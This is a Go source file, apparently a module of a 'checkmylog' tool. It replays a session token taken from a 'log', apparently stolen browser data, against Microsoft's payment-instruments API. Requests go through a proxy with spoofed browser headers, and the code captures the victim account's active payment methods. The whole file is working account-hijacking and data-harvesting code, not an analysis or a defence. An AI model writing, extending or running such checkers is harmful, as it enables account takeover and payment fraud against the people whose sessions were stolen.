package microsoft

import (
	"encoding/json"
	"github.com/restartfu/checkmylog/checkmylog"
	http "github.com/saucesteals/fhttp"
	"io"
	"net/url"
)

// Microsoft is the checker for MICROSOFT.
type Microsoft struct{}

// Name ...
func (m Microsoft) Name() string {
	return "MICROSOFT"
}

// URL ...
func (m Microsoft) URL() url.URL {
	return url.URL{Scheme: "https", Host: "microsoft.com"}
}

// Options ...
func (m Microsoft) Options() checkmylog.Opts {
	return checkmylog.Opts{
		Proxied: true,
	}
}

// Capture ...
func (m Microsoft) Capture(log checkmylog.Log) (checkmylog.Account, bool) {
	tok, ok := m.authorization(log)
	if !ok {
		return nil, false
	}

	req, err := http.NewRequest("GET", "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active&language=fr-FR&partner=northstarweb", nil)
	if err != nil {
		panic(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3")
	req.Header.Set("Authorization", "MSADELEGATE1.0="+tok)
	req.Header.Set("Referer", "https://account.microsoft.com/")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", "https://account.microsoft.com")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-site")
	req.Header.Set("TE", "trailers")

	resp, err := log.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return nil, false
	}

	defer resp.Body.Close()
	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	var paymentMethods []paymentProfile
	_ = json.Unmarshal(bodyText, &paymentMethods)

	return account{paymentProfiles: paymentMethods}, true
}
